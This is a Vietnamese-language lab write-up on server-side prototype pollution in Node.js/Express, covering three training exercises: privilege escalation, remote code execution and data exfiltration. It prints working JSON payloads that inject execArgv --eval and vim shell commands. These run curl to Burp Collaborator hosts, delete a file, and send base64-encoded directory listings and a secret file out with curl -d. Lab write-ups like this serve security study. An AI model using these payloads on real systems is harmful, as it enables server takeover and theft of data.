## 8.Lab: Bypassing flawed input filters for server-side prototype pollution

### Đề bài

![image](https://hackmd.io/_uploads/rkNNT7rVJe.png)

### Phân tích

Phòng thí nghiệm này được xây dựng trên Node.js và khung Express. Nó dễ bị ô nhiễm nguyên mẫu phía máy chủ vì nó kết hợp không an toàn dữ liệu đầu vào do người dùng kiểm soát vào đối tượng JavaScript phía máy chủ.

Để giải bài toán này:

Tìm một nguồn ô nhiễm nguyên mẫu mà bạn có thể sử dụng để thêm các thuộc tính tùy ý vào toàn cục Object.prototype.
Xác định thuộc tính tiện ích mà bạn có thể sử dụng để nâng cao quyền hạn của mình.
Truy cập bảng quản trị và xóa người dùng carlos.
Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau:`wiener:peter`

- Quan sát thấy thụt lề JSON dường như không bị ảnh hưởng.

![image](https://hackmd.io/_uploads/SkH0aQrNJg.png)

- sửa đổi yêu cầu để thử làm ô nhiễm nguyên mẫu thông qua constructorthuộc tính:

```javascript
"constructor": {
    "prototype": {
        "json spaces":10
    }
}
```

![image](https://hackmd.io/_uploads/rJ7PCQrN1x.png)

### Khai thác

- Sửa đổi yêu cầu để thử làm ô nhiễm nguyên mẫu bằng `isAdmin` thuộc tính của riêng bạn:

```javascript
"constructor": {
    "prototype": {
        "isAdmin":true
    }
}
```

![image](https://hackmd.io/_uploads/BJusCQr4Jx.png)

![image](https://hackmd.io/_uploads/HJIR07rVJl.png)

![image](https://hackmd.io/_uploads/S1kJyEH4kx.png)

## 9.Lab: Remote code execution via server-side prototype pollution

### Đề bài

![image](https://hackmd.io/_uploads/H1I_kESEkl.png)

### Phân tích

- đăng nhập vào thấy user wiener đã có quyền admin

![image](https://hackmd.io/_uploads/Hk-mlEHEJg.png)

![image](https://hackmd.io/_uploads/HJawxVSEyg.png)

![image](https://hackmd.io/_uploads/BkxqgNSVye.png)

- Trong trình duyệt, hãy vào bảng quản trị và quan sát thấy có một nút để chạy công việc bảo trì.

![image](https://hackmd.io/_uploads/rJ0b-4SNye.png)

Nhấp vào nút và quan sát rằng điều này kích hoạt các tác vụ nền dọn dẹp cơ sở dữ liệu và hệ thống tệp. Đây là ví dụ điển hình về loại chức năng có thể tạo ra các tiến trình con của nút.

Hãy thử làm ô nhiễm nguyên mẫu bằng một execArgvthuộc tính độc hại để thêm --evalđối số vào tiến trình con được sinh ra. Sử dụng thuộc tính này để gọi execSync()sink, truyền vào một lệnh kích hoạt tương tác với máy chủ Burp Collaborator công khai. Ví dụ:

```javascript
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```

### Khai thác

- thử làm ô nhiễm nguyên mẫu bằng một execArgvthuộc tính độc hại để thêm --evalđối số vào tiến trình con được sinh ra. Sử dụng thuộc tính này để gọi execSync()sink, truyền vào một lệnh kích hoạt tương tác với máy chủ Burp Collaborator công khai. Ví dụ:

```javascript
"__proto__": {
    "execArgv":[       "--eval=require('child_process').execSync('curl https://rjewso9aui734ss8yyo2ee8w2n8ew9ky.oastify.com')"
    ]
}
```

![image](https://hackmd.io/_uploads/By4GMNHNkg.png)

![image](https://hackmd.io/_uploads/SJ9aWNBN1e.png)

```javascript
child_process.fork(modulePath[, args][, options])
```

- execArgv là một danh sách các arguments (đối số) được truyền vào phương thức để thực thi, và có giá trị mặc định process.execArgv.

```javascript
"__proto__": {
    "execArgv":[       "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
```

![image](https://hackmd.io/_uploads/BJZYG4H4yx.png)

## 10.Lab: Exfiltrating sensitive data via server-side prototype pollution

### Đề bài

![image](https://hackmd.io/_uploads/S18mXNBEke.png)

### Phân tích

- chúng ta cần kích hoạt thực thi từ xa một lệnh rò rỉ nội dung trong thư mục gốc của Carlos ( /home/carlos) tới máy chủ Burp Collaborator công khai.
  Truyền nội dung của một tập tin bí mật trong thư mục này tới máy chủ Burp Collaborator công khai.

![image](https://hackmd.io/_uploads/rkuC7NrNJg.png)

![image](https://hackmd.io/_uploads/rykfVVHVyx.png)

### Khai thác

Vào bảng quản trị và thấy có nút để chạy công việc bảo trì.

Nhấp vào nút và quan sát rằng điều này kích hoạt các tác vụ nền dọn dẹp cơ sở dữ liệu và hệ thống tệp. Đây là ví dụ điển hình về loại chức năng có thể tạo ra các tiến trình con của nút.

![image](https://hackmd.io/_uploads/SJ7KVNHEkl.png)

![image](https://hackmd.io/_uploads/rkXVBNHNyg.png)

![image](https://hackmd.io/_uploads/HyFq4ESEJg.png)

```javascript
"__proto__": {
    "shell":"vim",
    "input":":! ls /home/carlos | base64 | curl -d @-  https://hh2mqe70s85t2iqywomsc46m0d64u2ir.oastify.com\n"
}
```

![image](https://hackmd.io/_uploads/rkzcSNHV1e.png)

![image](https://hackmd.io/_uploads/BkJ_rNBEJe.png)

Lưu ý rằng bạn đã nhận được một POSTyêu cầu HTTP mới với nội dung được mã hóa Base64.

Giải mã nội dung của cơ thể để khám phá bí mật

```javascript
"__proto__": {
    "shell":"vim",
    "input":":! cat /home/carlos/secret | base64 | curl -d @-  https://hh2mqe70s85t2iqywomsc46m0d64u2ir.oastify.com\n"
}
```

![image](https://hackmd.io/_uploads/B18hLVBVke.png)

![image](https://hackmd.io/_uploads/BkzCU4rE1x.png)

![image](https://hackmd.io/_uploads/HyOkD4SVkg.png)

![image](https://hackmd.io/_uploads/SkZgwEBNkl.png)

## Tham khảo

- https://hackmd.io/@Nightcore/H1pbF8UgC?utm_source=preview-mode&utm_medium=rec
- https://sheon.hashnode.dev/web-hacking-prototype-pollution-attack
- https://sheon.hashnode.dev/web-hacking-prototype-pollution-attack
- https://payatu.com/blog/prototype-pollution-vulnerabilities/
